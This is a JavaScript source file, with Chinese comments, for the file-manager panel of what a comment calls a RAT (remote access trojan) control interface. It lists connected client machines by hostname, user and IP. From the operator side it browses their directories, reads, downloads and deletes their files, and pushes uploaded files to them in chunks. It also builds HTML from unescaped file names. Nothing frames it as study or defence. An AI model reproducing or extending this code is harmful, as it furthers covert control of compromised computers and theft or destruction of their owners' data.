// 文件管理器专用JavaScript
class FileManager {
    constructor() {
        this.currentClientId = "";
        this.isConnected = false;
        this.socket = io();
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.setupSocketEvents();
        this.updateConnectionStatus();
        this.loadAvailableClients();
    }

    setupEventListeners() {
        // 连接按钮事件
        document.getElementById('btn_connect').addEventListener('click', () => {
            this.connectToClient();
        });

        document.getElementById('btn_disconnect').addEventListener('click', () => {
            this.disconnectFromClient();
        });

        // 文件操作按钮事件
        document.getElementById('btn_list').addEventListener('click', () => {
            this.doList();
        });

        document.getElementById('btn_up').addEventListener('click', () => {
            this.goUpDirectory();
        });

        document.getElementById('btn_upload').addEventListener('click', () => {
            this.uploadFile();
        });

        // 客户端选择变化事件
        const clientSelect = document.getElementById('client-select');
        clientSelect.addEventListener('change', () => {
            this.updateClientInfo();
        });

        // 路径输入框回车事件
        document.getElementById('path').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                this.doList();
            }
        });

        // 检查URL参数中是否有指定的客户端
        const urlParams = new URLSearchParams(window.location.search);
        const clientParam = urlParams.get('client');
        if (clientParam) {
            this.currentClientId = clientParam;
            setTimeout(() => {
                const clientSelect = document.getElementById('client-select');
                if (clientSelect) {
                    clientSelect.value = clientParam;
                    this.connectToClient();
                }
            }, 1000);
        }
    }

    setupSocketEvents() {
        this.socket.on('connect', () => {
            // 删除连接消息显示，直接加载客户端
            this.loadAvailableClients();
        });

        this.socket.on('disconnect', () => {
            this.setStatus('与服务器断开连接', 'error');
        });

        this.socket.on('clients_list', (data) => {
            this.updateClientDropdown(data.clients);
        });

        this.socket.on('dir_list', (data) => {
            if (data.client_id !== this.currentClientId) return;
            this.handleDirectoryList(data);
        });

        this.socket.on('file_text', (data) => {
            if (data.client_id !== this.currentClientId) return;
            this.handleFileContent(data);
        });

        this.socket.on('command_result', (data) => {
            if (data.target_id && data.target_id !== this.currentClientId) return;
            this.handleCommandResult(data);
        });
    }

    loadAvailableClients() {
        this.socket.emit('get_clients');
    }

    updateClientDropdown(clients) {
        const select = document.getElementById('client-select');
        const previouslySelected = select.value;
        const clientInfoPanel = document.getElementById('client-info-panel');

        // 清空现有选项
        select.innerHTML = '<option value="">请选择客户端</option>';

        if (!clients || Object.keys(clients).length === 0) {
            clientInfoPanel.style.display = 'none';
            return;
        }

        Object.keys(clients).forEach(clientId => {
            const clientInfo = clients[clientId];
            const option = document.createElement('option');
            option.value = clientId;
            const displayName = clientInfo.hostname || `客户端 ${clientId}`;
            option.textContent = `${displayName} - ${clientInfo.user || '未知用户'} (${clientInfo.addr || '未知IP'})`;
            select.appendChild(option);
        });

        // 恢复之前的选择
        if (previouslySelected && clients[previouslySelected]) {
            select.value = previouslySelected;
            this.updateClientInfo(clients[previouslySelected]);
        }
        
        // 添加选择变化事件
        select.addEventListener('change', () => {
            const selectedClientId = select.value;
            if (selectedClientId && clients[selectedClientId]) {
                this.updateClientInfo(clients[selectedClientId]);
            } else {
                clientInfoPanel.style.display = 'none';
            }
        });
    }
    
    updateClientInfo(clientInfo) {
        const clientInfoPanel = document.getElementById('client-info-panel');
        const statusEl = document.getElementById('client-status');
        const addressEl = document.getElementById('client-address');
        const userEl = document.getElementById('client-user');
        
        if (clientInfo) {
            clientInfoPanel.style.display = 'block';
            statusEl.textContent = '在线';
            addressEl.textContent = clientInfo.addr || '未知';
            userEl.textContent = clientInfo.user || '未知';
        } else {
            clientInfoPanel.style.display = 'none';
        }
    }

    connectToClient() {
        const clientSelect = document.getElementById('client-select');
        this.currentClientId = clientSelect.value;
        
        if (!this.currentClientId) {
            alert('请先选择一个客户端！');
            return;
        }
        
        this.setStatus('正在连接客户端...', 'info');
        
        // 直接设置为已连接状态，因为客户端已经通过RAT连接
        this.isConnected = true;
        this.updateConnectionStatus();
        this.setStatus(`已连接到客户端 ${this.currentClientId}`, 'success');
        
        // 自动列出根目录
        this.doList();
    }

    disconnectFromClient() {
        this.isConnected = false;
        this.updateConnectionStatus();
        this.setStatus('已断开连接', 'info');
        
        // 清空文件列表
        this.clearFileList();
        
        // 清空文件内容
        document.getElementById('file_text').textContent = '请先连接客户端来管理文件。';
    }

    updateConnectionStatus() {
        const elements = {
            connectBtn: document.getElementById('btn_connect'),
            disconnectBtn: document.getElementById('btn_disconnect'),
            listBtn: document.getElementById('btn_list'),
            upBtn: document.getElementById('btn_up'),
            uploadInput: document.getElementById('upload_input'),
            uploadBtn: document.getElementById('btn_upload')
        };
        
        if (this.isConnected) {
            elements.connectBtn.disabled = true;
            elements.disconnectBtn.disabled = false;
            elements.listBtn.disabled = false;
            elements.upBtn.disabled = false;
            elements.uploadInput.disabled = false;
            elements.uploadBtn.disabled = false;
        } else {
            elements.connectBtn.disabled = false;
            elements.disconnectBtn.disabled = true;
            elements.listBtn.disabled = true;
            elements.upBtn.disabled = true;
            elements.uploadInput.disabled = true;
            elements.uploadBtn.disabled = true;
        }
    }

    setStatus(text, type = 'info') {
        const statusEl = document.getElementById('status');
        const icons = {
            info: 'bx-info-circle',
            success: 'bx-check-circle',
            error: 'bx-error-circle',
            warning: 'bx-error'
        };
        
        statusEl.innerHTML = `<i class='bx ${icons[type] || icons.info}'></i> ${text}`;
        statusEl.className = type === 'error' ? 'text-danger' : 
                           type === 'success' ? 'text-success' : 
                           type === 'warning' ? 'text-warning' : '';
    }

    doList() {
        if (!this.isConnected) {
            this.setStatus('请先连接客户端', 'error');
            return;
        }
        
        const path = document.getElementById('path').value || '';
        this.socket.emit('request_list_dir', { client_id: this.currentClientId, path: path });
        this.setStatus('正在列出目录...', 'info');
    }

    goUpDirectory() {
        let path = document.getElementById('path').value;
        if (!path) return;
        
        path = path.replace(/[/\\]+$/, '');
        const lastSlash = Math.max(path.lastIndexOf('/'), path.lastIndexOf('\\'));
        if (lastSlash > 0) {
            path = path.substring(0, lastSlash);
        } else if (lastSlash === 0) {
            path = path.substring(0, 1);
        } else {
            path = '';
        }
        
        document.getElementById('path').value = path;
        this.doList();
    }

    uploadFile() {
        const input = document.getElementById('upload_input');
        if (!input.files || input.files.length === 0) {
            alert('请选择要上传的文件');
            return;
        }
        
        const file = input.files[0];
        const destDir = document.getElementById('path').value || '';
        const separator = destDir.endsWith('/') || destDir.endsWith('\\') ? '' : '/';
        const destPath = destDir + separator + file.name;
        
        this.performFileUpload(file, destPath);
    }

    performFileUpload(file, destPath) {
        const chunkSize = 64 * 1024; // 64KB
        const reader = new FileReader();
        let offset = 0;
        
        const progressBar = document.querySelector('.upload-progress-bar');
        const progressContainer = document.querySelector('.upload-progress');
        progressContainer.style.display = 'block';
        
        reader.onload = (e) => {
            const arrayBuffer = e.target.result;
            const total = arrayBuffer.byteLength;
            
            const sendChunk = () => {
                const end = Math.min(offset + chunkSize, total);
                const slice = arrayBuffer.slice(offset, end);
                
                // 转换为base64
                const u8 = new Uint8Array(slice);
                let binary = '';
                for (let i = 0; i < u8.length; i++) {
                    binary += String.fromCharCode(u8[i]);
                }
                const b64 = btoa(binary);
                
                const isLast = end >= total;
                this.socket.emit('web_upload_chunk', {
                    client_id: this.currentClientId,
                    dest_path: destPath,
                    chunk_index: Math.floor(offset / chunkSize),
                    total_chunks: Math.ceil(total / chunkSize),
                    data: b64,
                    is_last: isLast
                });
                
                offset = end;
                const progress = Math.min(100, Math.round(offset / total * 100));
                progressBar.style.width = progress + '%';
                this.setStatus(`上传中 ${progress}%`, 'info');
                
                if (!isLast) {
                    setTimeout(sendChunk, 10);
                } else {
                    this.setStatus('上传完成，等待服务器确认...', 'success');
                    setTimeout(() => {
                        progressContainer.style.display = 'none';
                        progressBar.style.width = '0%';
                    }, 2000);
                }
            };
            
            sendChunk();
        };
        
        reader.readAsArrayBuffer(file);
    }

    handleDirectoryList(data) {
        if (!data.dir_list) { 
            this.setStatus('列出目录失败', 'error'); 
            return; 
        }
        
        const tbody = document.querySelector('#files_tbl tbody');
        tbody.innerHTML = '';
        const cwd = data.dir_list.cwd;
        document.getElementById('path').value = cwd;
        
        const entries = data.dir_list.entries || [];
        entries.sort((a, b) => (b.is_dir - a.is_dir) || (b.mtime - a.mtime));
        
        if (entries.length === 0) {
            tbody.innerHTML = `
                <tr>
                    <td colspan="5" class="text-center text-muted py-4">
                        <i class='bx bx-folder-open'></i>
                        此目录为空
                    </td>
                </tr>
            `;
        } else {
            entries.forEach(entry => {
                const tr = this.createFileRow(entry);
                tbody.appendChild(tr);
            });
        }
        
        this.setStatus(`成功列出目录: ${cwd}`, 'success');
    }

    createFileRow(entry) {
        const tr = document.createElement('tr');
        
        // 名称列
        const nameCell = document.createElement('td');
        nameCell.innerHTML = `
            <div class="d-flex align-items-center gap-2">
                <i class='bx ${entry.is_dir ? 'bxs-folder' : 'bxs-file-blank'} text-${entry.is_dir ? 'warning' : 'primary'}'></i>
                <span>${entry.name}</span>
            </div>
        `;
        
        // 类型列
        const typeCell = document.createElement('td');
        typeCell.innerHTML = `<span class="badge ${entry.is_dir ? 'badge-warning' : 'badge-info'}">${entry.is_dir ? '目录' : '文件'}</span>`;
        
        // 大小列
        const sizeCell = document.createElement('td');
        sizeCell.textContent = entry.is_dir ? '-' : this.formatFileSize(entry.size || 0);
        
        // 修改时间列
        const mtimeCell = document.createElement('td');
        const dt = new Date((entry.mtime || 0) * 1000);
        mtimeCell.innerHTML = `<small class="text-muted">${isNaN(dt.getTime()) ? '未知' : dt.toLocaleString()}</small>`;
        
        // 操作列
        const actionsCell = document.createElement('td');
        actionsCell.className = 'file-actions';
        
        if (entry.is_dir) {
            actionsCell.innerHTML = `
                <button class="btn btn-primary btn-sm" onclick="fileManager.openDirectory('${entry.name}')">
                    <i class='bx bx-folder-open'></i>
                    打开
                </button>
            `;
        } else {
            actionsCell.innerHTML = `
                <button class="btn btn-info btn-sm" onclick="fileManager.readFile('${entry.name}')">
                    <i class='bx bx-file'></i>
                    查看
                </button>
                <button class="btn btn-success btn-sm" onclick="fileManager.downloadFile('${entry.name}')">
                    <i class='bx bx-download'></i>
                    下载
                </button>
                <button class="btn btn-danger btn-sm" onclick="fileManager.deleteFile('${entry.name}')">
                    <i class='bx bx-trash'></i>
                    删除
                </button>
            `;
        }
        
        tr.appendChild(nameCell);
        tr.appendChild(typeCell);
        tr.appendChild(sizeCell);
        tr.appendChild(mtimeCell);
        tr.appendChild(actionsCell);
        
        return tr;
    }

    clearFileList() {
        const tbody = document.querySelector('#files_tbl tbody');
        tbody.innerHTML = `
            <tr>
                <td colspan="5" class="text-center text-muted py-4">
                    <i class='bx bx-info-circle'></i>
                    请先连接客户端
                </td>
            </tr>
        `;
    }

    openDirectory(name) {
        const currentPath = document.getElementById('path').value;
        const separator = currentPath.endsWith('/') || currentPath.endsWith('\\') ? '' : '/';
        document.getElementById('path').value = currentPath + separator + name;
        this.doList();
    }

    readFile(name) {
        const currentPath = document.getElementById('path').value;
        const separator = currentPath.endsWith('/') || currentPath.endsWith('\\') ? '' : '/';
        const filePath = currentPath + separator + name;
        this.socket.emit('request_read_file', { client_id: this.currentClientId, path: filePath });
        this.setStatus('正在读取文件...', 'info');
    }

    downloadFile(name) {
        const currentPath = document.getElementById('path').value;
        const separator = currentPath.endsWith('/') || currentPath.endsWith('\\') ? '' : '/';
        const filePath = currentPath + separator + name;
        this.socket.emit('send_command', { 
            target: this.currentClientId, 
            command: { action: "download", arg: filePath } 
        });
        this.setStatus('正在请求下载...', 'info');
    }

    deleteFile(name) {
        if (confirm(`确定要删除 "${name}" 吗？`)) {
            const currentPath = document.getElementById('path').value;
            const separator = currentPath.endsWith('/') || currentPath.endsWith('\\') ? '' : '/';
            const filePath = currentPath + separator + name;
            this.socket.emit('request_delete_path', { client_id: this.currentClientId, path: filePath });
            this.setStatus('正在删除文件...', 'info');
        }
    }

    handleFileContent(data) {
        const pre = document.getElementById('file_text');
        if (data.is_base64) {
            // 检查是否为图片文件
            if (this.isImageFile(data.path)) {
                this.displayImagePreview(pre, data.text, data.path);
            } else {
                pre.textContent = "(文件为二进制，base64 显示)\n" + data.text;
            }
        } else {
            pre.textContent = data.text;
        }
        this.setStatus(`已获取文件: ${data.path}`, 'success');
    }

    isImageFile(filePath) {
        const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.svg', '.ico', '.tiff', '.tif'];
        const extension = filePath.toLowerCase().substring(filePath.lastIndexOf('.'));
        return imageExtensions.includes(extension);
    }

    displayImagePreview(container, base64Data, filePath) {
        // 清空容器
        container.innerHTML = '';
        
        // 创建图片预览容器
        const previewContainer = document.createElement('div');
        previewContainer.className = 'image-preview-container';
        previewContainer.style.cssText = `
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 1rem;
            background: var(--light-bg);
            border-radius: var(--radius-md);
            height: 100%;
            overflow: auto;
        `;

        // 创建文件信息
        const fileInfo = document.createElement('div');
        fileInfo.className = 'file-info';
        fileInfo.style.cssText = `
            margin-bottom: 1rem;
            text-align: center;
            color: var(--text-secondary);
            font-size: 0.875rem;
        `;
        fileInfo.innerHTML = `
            <i class='bx bx-image'></i>
            <strong>图片预览</strong><br>
            <span>${filePath}</span>
        `;

        // 创建图片元素
        const img = document.createElement('img');
        img.style.cssText = `
            max-width: 100%;
            max-height: calc(100% - 80px);
            object-fit: contain;
            border-radius: var(--radius-sm);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            background: white;
        `;

        // 获取文件扩展名来确定MIME类型
        const extension = filePath.toLowerCase().substring(filePath.lastIndexOf('.'));
        let mimeType = 'image/jpeg'; // 默认
        
        switch(extension) {
            case '.png':
                mimeType = 'image/png';
                break;
            case '.gif':
                mimeType = 'image/gif';
                break;
            case '.bmp':
                mimeType = 'image/bmp';
                break;
            case '.webp':
                mimeType = 'image/webp';
                break;
            case '.svg':
                mimeType = 'image/svg+xml';
                break;
            case '.ico':
                mimeType = 'image/x-icon';
                break;
            case '.tiff':
            case '.tif':
                mimeType = 'image/tiff';
                break;
            default:
                mimeType = 'image/jpeg';
        }

        // 设置图片源
        img.src = `data:${mimeType};base64,${base64Data}`;
        
        // 添加加载错误处理
        img.onerror = () => {
            previewContainer.innerHTML = `
                <div style="text-align: center; color: var(--text-muted); padding: 2rem;">
                    <i class='bx bx-error' style="font-size: 3rem; margin-bottom: 1rem;"></i>
                    <p>图片加载失败</p>
                    <p style="font-size: 0.875rem;">可能是不支持的图片格式</p>
                </div>
            `;
        };

        // 添加加载成功处理
        img.onload = () => {
            // 添加图片信息
            const imgInfo = document.createElement('div');
            imgInfo.style.cssText = `
                margin-top: 1rem;
                text-align: center;
                color: var(--text-muted);
                font-size: 0.75rem;
            `;
            imgInfo.textContent = `尺寸: ${img.naturalWidth} × ${img.naturalHeight}`;
            previewContainer.appendChild(imgInfo);
        };

        // 组装预览容器
        previewContainer.appendChild(fileInfo);
        previewContainer.appendChild(img);
        
        // 添加到主容器
        container.appendChild(previewContainer);
    }

    handleCommandResult(data) {
        const pre = document.getElementById('file_text');
        if (data.output) {
            pre.textContent = data.output;
            this.setStatus('收到命令响应', 'info');
        }
    }

    formatFileSize(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
}

// 全局实例
let fileManager;

// 页面加载完成后初始化
document.addEventListener('DOMContentLoaded', function() {
    fileManager = new FileManager();
});